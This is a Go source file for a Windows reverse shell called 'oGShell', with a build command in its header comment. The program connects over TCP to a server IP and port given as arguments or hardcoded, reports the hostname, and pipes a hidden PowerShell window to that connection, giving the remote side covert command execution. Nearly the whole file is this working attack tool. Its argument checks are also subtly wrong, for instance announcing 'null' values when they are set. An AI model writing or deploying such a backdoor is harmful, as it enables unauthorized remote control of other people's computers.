//go:build windows

/*
To build, edit the serverIp and serverPort variable, if wanted, and use the following command:
GOOS=windows GOARCH=amd64 go build -o oGShell.exe cmd/windows/main.go
*/
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func main() {
	// Set server ip and port to null
	// Can set these before building if you want to hardcode them, otherwise they will be read from command-line arguments
	serverIP := ""
	serverPort := ""

	// Check if arguments are provided
	switch len(os.Args) {
	case 3:
		serverIP = os.Args[1]
		serverPort = os.Args[2]
		// Check to make sure that the provided IP and Port are valid
		if net.ParseIP(serverIP) == nil {
			fmt.Printf("Invalid IP address: %s\n", serverIP)
			if serverIP != "" && serverPort != "" {
				fmt.Printf("Hardcoded IP and port is %s:%s\n", serverIP, serverPort)
				fmt.Print("Would you like to continue with this host? (Y/N) ")
				var flag string
				fmt.Scanf("%s", &flag)
				if strings.ToLower(flag) == "n" {
					fmt.Println("Quitting.")
					return
				}
			}
		} else {
			break
		}
		fallthrough
	case 1:
		fmt.Printf("Attempting to use hardcoded IP and Port: %s:%s\n", serverIP, serverPort)
		if serverIP != "" && serverPort != "" {
			fmt.Println("IP and Port are null, quitting.")
			break
		}
		fallthrough
	default:
		fmt.Println("If you want to provide IP and Port at runtime, use:")
		fmt.Println("oGShell.exe <serverIP> <serverPort>")
		fmt.Println("")
		fmt.Println("If you want to hardcode the IP and Port, set the serverIP and serverPort variables in the main function before building.")
		return
	}

	address := net.JoinHostPort(serverIP, serverPort)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("Error connecting to server: %v\n", err)
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	cmd := exec.Command("powershell.exe")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	if err := cmd.Run(); err != nil {
		fmt.Printf("Error starting shell: %v\n", err)
	}

	fmt.Printf("Connected to server at %s\n", address)
}
